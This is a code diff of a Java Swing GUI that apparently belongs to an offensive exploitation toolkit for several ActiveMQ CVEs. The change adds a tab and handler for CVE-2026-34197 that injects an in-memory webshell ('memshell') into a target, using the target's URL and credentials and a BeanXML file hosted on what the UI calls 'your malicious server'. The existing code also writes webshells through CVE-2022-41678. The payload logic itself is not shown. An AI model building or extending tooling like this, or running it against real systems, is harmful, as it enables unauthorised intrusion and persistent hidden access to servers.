@@ -18,6 +18,7 @@ public class MainFrame extends JFrame {
     private CVE20155254Panel cve20155254Panel;
     private CVE20163088Panel cve20163088Panel;
     private CVE202241678Panel cve202241678Panel;
+    private CVE202634197Panel cve202634197Panel;
     private JTabbedPane mainTabbedPane;
     
     private EnvironmentService environmentService;
@@ -51,11 +52,13 @@ public class MainFrame extends JFrame {
         cve20155254Panel = new CVE20155254Panel();
         cve20163088Panel = new CVE20163088Panel();
         cve202241678Panel = new CVE202241678Panel();
+        cve202634197Panel = new CVE202634197Panel();
         
         mainTabbedPane.addTab("目标环境", targetEnvPanel);
         mainTabbedPane.addTab("CVE-2015-5254", cve20155254Panel);
         mainTabbedPane.addTab("CVE-2016-3088", cve20163088Panel);
         mainTabbedPane.addTab("CVE-2022-41678", cve202241678Panel);
+        mainTabbedPane.addTab("CVE-2026-34197", cve202634197Panel);
         mainTabbedPane.addTab("BeanXML设置", beanXmlPanel);
         mainTabbedPane.addTab("程序设置", settingsPanel);
         
@@ -77,6 +80,8 @@ public class MainFrame extends JFrame {
         
         cve202241678Panel.addExecuteListener(e -> exploitCVE202241678());
         cve202241678Panel.addWriteWebshellListener(e -> writeWebshellCVE202241678());
+        
+        cve202634197Panel.addInjectListener(e -> injectMemshellCVE202634197());
     }
     
     private void detectEnvironment() {
@@ -272,6 +277,32 @@ public class MainFrame extends JFrame {
                     cve202241678Panel.setWebshellPath(outPath[0]);
                 }
                 cve202241678Panel.setResult("写入执行结果:\n" + result);
+            });
+        }).start();
+    }
+    
+    private void injectMemshellCVE202634197() {
+        String url = topPanel.getTargetAddress();
+        if (url.isEmpty()) {
+            JOptionPane.showMessageDialog(this, "请输入目标地址！");
+            return;
+        }
+        
+        String username = topPanel.getUsername();
+        String password = topPanel.getPassword();
+        String xmlServer = topPanel.getHttpServer();
+        String connectionInfo = cve202634197Panel.getCurrentConnectionInfo();
+        
+        if (connectionInfo == null || connectionInfo.isEmpty()) {
+            JOptionPane.showMessageDialog(this, "请先生成 BeanXML 并复制到你的恶意服务器！");
+            return;
+        }
+        
+        cve202634197Panel.setResultText("[*] 开始执行 CVE-2026-34197 内存马注入...\n");
+        new Thread(() -> {
+            String result = vulnerabilityService.exploitCVE202634197(url, username, password, xmlServer, connectionInfo);
+            SwingUtilities.invokeLater(() -> {
+                cve202634197Panel.setResultText("注入执行结果:\n" + result);
             });
         }).start();
     }
